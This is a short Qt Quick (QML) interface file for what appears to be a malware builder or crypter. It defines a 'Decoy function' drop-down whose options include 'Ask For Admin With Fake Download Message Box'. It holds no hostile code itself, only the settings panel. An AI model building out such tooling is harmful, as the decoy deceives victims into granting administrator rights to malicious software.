import QtQuick
import QtQuick.Controls
import QtQuick.Layouts

ColumnLayout {
    spacing: 10

    ColumnLayout {
        Text {
            font.pointSize: 15
            text: "Decoy function"
        }

        ComboBox {
            id: encryption_type
            implicitContentWidthPolicy: ComboBox.WidestTextWhenCompleted
            model: [
                "Ask For Admin With Fake Download Message Box",
                "No Decoy Function"
            ]
        }       
    }
}